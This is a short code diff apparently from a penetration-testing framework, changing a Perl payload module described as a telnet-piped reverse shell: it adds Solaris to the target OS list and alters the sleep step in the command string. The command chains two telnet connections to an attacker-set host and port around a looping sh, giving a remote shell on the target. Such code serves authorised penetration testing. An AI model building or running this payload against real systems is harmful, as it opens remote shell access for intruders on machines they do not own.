@@ -22,7 +22,7 @@ my $info =
   'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
   'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
   'Priv'         => 0,
-  'OS'           => [ 'linux', 'bsd', 'hpux', 'irix', 'aix' ],
+  'OS'           => [ 'linux', 'bsd', 'hpux', 'irix', 'aix', 'solaris' ],
 };
 
 sub new {
@@ -40,7 +40,7 @@ sub CommandString {
   my $port = $self->GetVar('LPORT');
 
   my $command =
-    "sleep 1;".
+    "sleep 99999|".
     "telnet $host $port|".
     "while : ; do sh && break; done 2>&1|".
     "telnet $host $port";
